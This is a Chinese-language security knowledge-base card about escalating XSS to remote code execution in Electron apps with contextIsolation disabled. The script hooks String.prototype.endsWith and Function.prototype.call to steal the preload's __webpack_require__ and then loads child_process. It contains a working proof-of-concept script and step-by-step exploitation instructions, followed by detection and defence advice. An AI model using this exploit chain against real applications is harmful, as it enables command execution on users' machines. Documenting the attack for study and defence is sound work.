---
id: web-generic-xss-electron-contextisolation-webpack-require-escape
title: Electron contextIsolation:false + nodeIntegration:false 仍可 RCE：XSS 钩住 String.endsWith/Function.call 窃取 __webpack_require__，经 webpack require 加载 child_process 执行命令
type: scenario
domain: web
path: web/generic/xss
technique: electron-contextisolation-webpack-require-escape
aliases:
- contextIsolation 关闭 RCE
- 窃取 __webpack_require__
- Electron webpack require 逃逸
- String.prototype.endsWith 钩子
- Function.prototype.call 劫持
- Electron XSS Node 能力
tags:
- web
- xss
- electron
- contextisolation
- webpack
- prototype-hook
- nodejs
- rce
- desktop
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T08:06:14+08:00'
  notes: 已对照原文核对：原文明确NI关闭时靠V8洞，但contextIsolation禁用时无论nodeIntegration选项如何网页JS都可用Node能力；给出的钩子脚本（String.prototype.endsWith对/electron返回true并还原、Function.prototype.call在args[3].name===__webpack_require__时赋给window.__webpack_require__后还原）与卡内PoC逐字一致，window.__webpack_require__(module)._load(child_process).execFile(/System/Applications/Calculator...)亦与原文一致；卡内对拦截点（webpack解析/传参时走原型方法）的解释为合理推导，confidence=medium 恰当。dedup仅自匹配；与nodeIntegration卡、preload卡为related不同配置链（NI=false且靠原型钩子窃取webpack require），非同链。原文无版本区间与CVE，未set-versions；未复跑；无对应图片（4图不涉及本卡）。
---

## 一句话结论

Electron 关闭 `contextIsolation`、即使 `nodeIntegration: false`，渲染进程网页与 preload 仍共享同一个 JS 上下文；XSS 脚本可通过覆写 `String.prototype.endsWith`/`Function.prototype.call`，在 preload 的 webpack 运行时检查 `"/electron"` 模块与调用 `__webpack_require__` 时将其截获，随后 `window.__webpack_require__("module")._load("child_process")` 加载 Node 模块执行命令，把 XSS 升级为 RCE。

## 原理

- **contextIsolation 的作用**：它把 preload 脚本与网页脚本放在不同的 JS 上下文（不同 Realm）中，网页脚本无法访问 preload 的闭包与变量。关闭后两者共享全局对象与原型链，网页脚本可以污染 preload 会用到的原型方法，间接影响/截获 preload 的行为。
- **preload 里的 webpack 运行时**：打包后的 preload 代码会调用 `__webpack_require__` 加载模块；原文的拦截点利用 webpack 在解析模块路径时调用 `String.prototype.endsWith("/electron")`，以及内部通过 `Function.prototype.call` 传递 `__webpack_require__` 函数引用。
- **原型钩子窃取函数引用**：网页脚本先保存原方法，覆写 `String.prototype.endsWith`：当参数为 `"/electron"` 时返回 `true`（改变 preload 的模块判断分支）；同时覆写 `Function.prototype.call`，当第 4 个参数（`args[3]`）的 `name === "__webpack_require__"` 时把它赋给 `window.__webpack_require__` 并恢复原方法。这样 preload 后续调用时，网页脚本已拿到 webpack 的 require 函数引用。
- **从 webpack require 到 Node**：`window.__webpack_require__("module")` 拿到 Node 的 `module` 模块（webpack 外部化/特殊模块映射），其 `_load` 等价于 `require`；`_load("child_process").execFile(...)` 在 Electron 主/渲染进程上下文中执行系统命令（原文示例弹出 macOS 计算器）。
- **为什么成立**：contextIsolation 关闭使"网页原型链"与"preload 原型链"是同一套对象；任何依赖原型方法做安全判断的代码都可被网页侧篡改。nodeIntegration false 只移除了网页全局的 `require`，并没有隔离 preload 的 Node 能力。
- **前提**：`contextIsolation: false`；preload 使用 webpack 打包且存在可被截获的 `__webpack_require__` 调用/原型方法；XSS 可在页面加载早期执行（赶在 preload 关键调用之前）。

## 触发条件

- Electron 应用显式设置 `contextIsolation: false`（常见于为兼容旧 preload 而关闭），`nodeIntegration` 可为 false。
- preload 由 webpack 打包，运行时会在网页可影响的原型方法上做判断/调用。
- 渲染进程存在 XSS 且能在 preload 执行前/期间运行脚本。
- 应用未启用 sandbox，preload 拥有 Node 能力。

## 利用步骤

1. 确认 `contextIsolation` 为 false（可通过行为/版本/配置审计）。
2. 注入原型钩子：覆写 `String.prototype.endsWith` 让 `"/electron"` 判断恒真，覆写 `Function.prototype.call` 捕获 `__webpack_require__`。
3. 在钩子触发后，用 `window.__webpack_require__("module")._load("child_process")` 执行命令。
4. 验证弹计算器/执行命令；可进一步读写文件、外带数据。

## PoC

```html
<script>
const origEndWith = String.prototype.endsWith;
String.prototype.endsWith = function (...args) {
  if (args && args[0] === "/electron") {
    String.prototype.endsWith = origEndWith;
    return true;
  }
  return origEndWith.apply(this, args);
};

const origCallMethod = Function.prototype.call;
Function.prototype.call = function (...args) {
  if (args[3] && args[3].name === "__webpack_require__") {
    window.__webpack_require__ = args[3];
    Function.prototype.call = origCallMethod;
  }
  return origCallMethod.apply(this, args);
};
console.log(window.__webpack_require__);
</script>
```

```javascript
// 捕获成功后执行命令（原文为 macOS 计算器）
window.__webpack_require__("module")
  ._load("child_process")
  .execFile("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
```

## 变体与关联

- 关联：[[web-generic-xss-electron-nodeintegration-renderer-rce]]（nodeIntegration:true 的直接 require 路线）、[[web-generic-xss-electron-ipc-curl-file-read-bot-cookie]]（preload 暴露 IPC 的滥用）、[[ai-security-agent-security-deepchat-mermaid-xss-ipc-mcp-command-exec]]（Electron XSS 经 IPC 到 spawn）。
- 变体：其他原型（`Array.prototype`、`Object.defineProperty`、`toString`）也可用于影响 preload 逻辑；若 preload 暴露 `ipcRenderer`，可直接调用主进程危险 handler。
- 边界：`contextIsolation: true`（Electron 12+ 默认）时网页脚本与 preload 隔离，本链失效；CSP/脚本执行时机限制可能阻止钩子赶在 preload 前安装；webpack 版本/打包方式不同则截获点变化。

## 检测与防御

- **检测**：页面脚本篡改 `String.prototype.endsWith`/`Function.prototype.call` 等原型；渲染进程出现 `__webpack_require__` 访问与 `child_process` 调用；Electron 配置存在 `contextIsolation: false`。
- **防御**：启用 `contextIsolation: true`（默认）、`sandbox: true`、`nodeIntegration: false`；preload 只经 `contextBridge` 暴露最小 API；对网页输出净化与 CSP；升级 Electron 到默认安全配置的版本。
